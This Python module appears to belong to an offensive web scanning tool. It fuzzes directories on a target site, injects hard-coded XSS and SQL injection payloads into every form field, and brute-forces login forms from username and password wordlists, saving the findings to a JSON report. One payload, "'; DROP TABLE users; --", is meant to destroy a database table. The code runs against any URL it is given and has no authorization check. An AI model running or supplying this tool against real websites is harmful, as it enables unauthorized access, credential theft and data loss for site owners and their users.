import requests
import os
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import json
import datetime

def is_url_live(url):
    try:
        r = requests.get(url, timeout=3)
        return r.status_code < 400
    except:
        return False

def dir_fuzz(target_url, wordlist, threads=20):
    print(f"[+] Starting directory fuzz on: {target_url}")
    found = []

    def check_path(path):
        full_url = target_url.rstrip('/') + '/' + path
        try:
            r = requests.get(full_url, timeout=3)
            if r.status_code in [200, 301, 302]:
                print(f" - Found: {full_url} [{r.status_code}]")
                found.append(full_url)
        except:
            pass

    if not os.path.exists(wordlist):
        print(f"[-] Wordlist not found: {wordlist}")
        return []

    with open(wordlist) as f:
        words = [line.strip() for line in f if line.strip()]

    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(check_path, words)

    return found

xss_payloads = ['<script>alert(1)</script>', '" onmouseover="alert(1)', '<img src=x onerror=alert(1)>']
sqli_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1 --"]

def find_forms(url):
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.text, 'html.parser')
        return soup.find_all('form')
    except Exception as e:
        print(f"[-] Failed to fetch forms: {e}")
        return []

def submit_form(form, url, payload):
    action = form.get('action') or url
    method = form.get('method', 'get').lower()
    inputs = form.find_all('input')
    data = {}

    for i in inputs:
        name = i.get('name')
        if name:
            data[name] = payload

    target_url = url if action.startswith('/') else action
    try:
        if method == 'post':
            return requests.post(target_url, data=data, timeout=5)
        else:
            return requests.get(target_url, params=data, timeout=5)
    except:
        return None

def scan_xss_sqli(url):
    print(f"\n[+] Scanning {url} for XSS and SQLi vulnerabilities...")
    forms = find_forms(url)
    if not forms:
        print("[-] No forms found.")
        return

    for idx, form in enumerate(forms):
        print(f"\n[+] Testing form #{idx + 1}")
        for payload in xss_payloads + sqli_payloads:
            response = submit_form(form, url, payload)
            if response and payload in response.text:
                vuln_type = "XSS" if payload in xss_payloads else "SQLi"
                print(f" 🚨 Potential {vuln_type} found with payload: {payload}")

def bruteforce_login(url, userlist_path, passlist_path, success_keyword="dashboard"):
    print(f"\n[+] Starting login bruteforce on: {url}")

    if not os.path.exists(userlist_path) or not os.path.exists(passlist_path):
        print("[-] Wordlist file not found.")
        return

    with open(userlist_path) as ufile:
        usernames = [u.strip() for u in ufile if u.strip()]
    with open(passlist_path) as pfile:
        passwords = [p.strip() for p in pfile if p.strip()]

    for username in usernames:
        for password in passwords:
            data = {'username': username, 'password': password}
            try:
                r = requests.post(url, data=data, timeout=5, allow_redirects=True)
                if success_keyword.lower() in r.text.lower():
                    print(f" 🚀 Login Success: {username} / {password}")
                    return  # stop after first success
            except:
                continue
    print("[-] Bruteforce complete. No valid credentials found.")

def run_web_scan(args):
    url = args.target
    wordlist = args.wordlist or 'modules/web/common.txt'
    json_enabled = args.json_report

    results = {
        "target": url,
        "fuzzed_paths": [],
        "vulnerabilities": [],
        "login_success": None,
        "timestamp": str(datetime.datetime.now())
    }

    if not is_url_live(url):
        print(f"[-] Target URL not reachable: {url}")
        return

    # Directory Fuzzing
    found = dir_fuzz(url, wordlist)
    results["fuzzed_paths"] = found

    # XSS & SQLi Scan
    forms = find_forms(url)
    for form in forms:
        for payload in xss_payloads + sqli_payloads:
            response = submit_form(form, url, payload)
            if response and payload in response.text:
                vuln_type = "XSS" if payload in xss_payloads else "SQLi"
                print(f" 🚨 Potential {vuln_type} found with payload: {payload}")
                results["vulnerabilities"].append({
                    "type": vuln_type,
                    "payload": payload,
                    "url": url
                })

    # Login Bruteforce
    if args.brute_login and args.userlist and args.passlist:
        userlist = args.userlist
        passlist = args.passlist
        with open(userlist) as ufile:
            usernames = [u.strip() for u in ufile if u.strip()]
        with open(passlist) as pfile:
            passwords = [p.strip() for p in pfile if p.strip()]
        for username in usernames:
            for password in passwords:
                try:
                    r = requests.post(url, data={'username': username, 'password': password}, timeout=5)
                    if "dashboard" in r.text.lower():
                        print(f" 🚀 Login Success: {username} / {password}")
                        results["login_success"] = {"username": username, "password": password}
                        break
                except:
                    continue

    # Output to JSON
    if json_enabled:
        report_dir = "reports"
        os.makedirs(report_dir, exist_ok=True)
        filename = f"{report_dir}/web_scan_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=4)
        print(f"\n📝 Report saved to: {filename}")
